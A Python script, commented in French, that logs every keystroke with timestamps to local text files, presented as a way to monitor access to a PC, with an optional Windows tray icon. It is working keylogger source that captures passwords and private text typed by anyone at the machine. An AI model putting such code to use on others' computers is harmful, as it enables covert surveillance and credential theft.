#!/usr/bin/env python3
"""
Clavier Save - Enregistre les frappes clavier pour surveiller l'accès au PC
"""

import os
import sys
import threading
from datetime import datetime
from pathlib import Path
from pynput import keyboard
from pynput.keyboard import Key, Listener
import time

class ClavierSave:
    def __init__(self, custom_dir=None):
        self.keys = []

        # Utiliser le dossier personnalisé ou le dossier par défaut
        if custom_dir:
            self.log_dir = Path(custom_dir)
        else:
            self.log_dir = Path.home() / '.clavier_save'

        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.log_file = self.log_dir / f'save_{datetime.now().strftime("%Y%m%d")}.txt'
        self.session_start = datetime.now()
        self.running = True

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                char = key.char
            else:
                char = f'[{key.name}]'

            entry = {
                'timestamp': datetime.now().isoformat(),
                'key': char,
                'type': 'press'
            }
            self.keys.append(entry)

            # Sauvegarder tous les 50 touches
            if len(self.keys) >= 50:
                self._save_log()

        except Exception as e:
            print(f"Erreur on_press: {e}")

    def on_release(self, key):
        # Arrêter l'enregistrement si Ctrl+Alt+Q est pressé
        try:
            if key == Key.ctrl_l or key == Key.ctrl_r:
                pass
        except:
            pass

    def _save_log(self):
        try:
            # Ajouter les touches au fichier TXT
            with open(self.log_file, 'a', encoding='utf-8') as f:
                for entry in self.keys:
                    timestamp = entry['timestamp']
                    key = entry['key']
                    f.write(f"[{timestamp}] {key}\n")

            self.keys = []
        except Exception as e:
            print(f"Erreur sauvegarde: {e}")

    def start(self):
        print(f"Enregistrement lancé - Logs: {self.log_file}")

        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            try:
                while self.running:
                    time.sleep(1)
                    # Sauvegarder les logs tous les 5 minutes
                    if len(self.keys) > 0:
                        now = datetime.now()
                        if (now - self.session_start).total_seconds() % 300 < 1:
                            self._save_log()
            except KeyboardInterrupt:
                self._save_log()
                print("Enregistrement arrêté")

    def stop(self):
        self.running = False
        self._save_log()

def run_gui(custom_dir=None):
    """Créer une interface GUI minimale avec icône de barre des tâches (Windows)"""
    try:
        import tkinter as tk
        from tkinter import messagebox
        import pystray
        from PIL import Image, ImageDraw

        monitor = ClavierSave(custom_dir=custom_dir)

        def create_image():
            width = 64
            height = 64
            image = Image.new('RGB', (width, height), color='white')
            draw = ImageDraw.Draw(image)
            draw.rectangle([10, 10, 54, 54], outline='blue', width=2)
            draw.text((10, 20), 'SAVE', fill='blue')
            return image

        def on_quit(icon, item):
            monitor.stop()
            icon.stop()
            sys.exit(0)

        def show_status(icon, item):
            if monitor.log_file.exists():
                size = monitor.log_file.stat().st_size
                messagebox.showinfo("Statut",
                    f"Enregistrement actif\nFichier: {monitor.log_file}\nTaille: {size} bytes")

        menu = (
            pystray.MenuItem('Voir les logs', show_status),
            pystray.MenuItem('Quitter', on_quit),
        )

        icon = pystray.Icon("clavier_save", create_image(), menu=menu)

        # Lancer l'enregistrement dans un thread
        monitor_thread = threading.Thread(target=monitor.start, daemon=False)
        monitor_thread.start()

        icon.run()

    except ImportError:
        print("Mode console - dépendances GUI non disponibles")
        monitor = ClavierSave(custom_dir=custom_dir)
        monitor.start()

if __name__ == '__main__':
    # Dossier personnalisé pour les logs
    custom_log_dir = None
    if sys.platform == 'win32':
        custom_log_dir = r"C:\Users\FRMK0319APPF\Desktop\RAYON_SAUVEGARDE\GAETAN\IA\clavier_save"

    # Vérifier si on est sur Windows
    if sys.platform == 'win32':
        try:
            run_gui(custom_dir=custom_log_dir)
        except Exception as e:
            print(f"Erreur GUI: {e}")
            monitor = ClavierSave(custom_dir=custom_log_dir)
            monitor.start()
    else:
        monitor = ClavierSave(custom_dir=custom_log_dir)
        monitor.start()
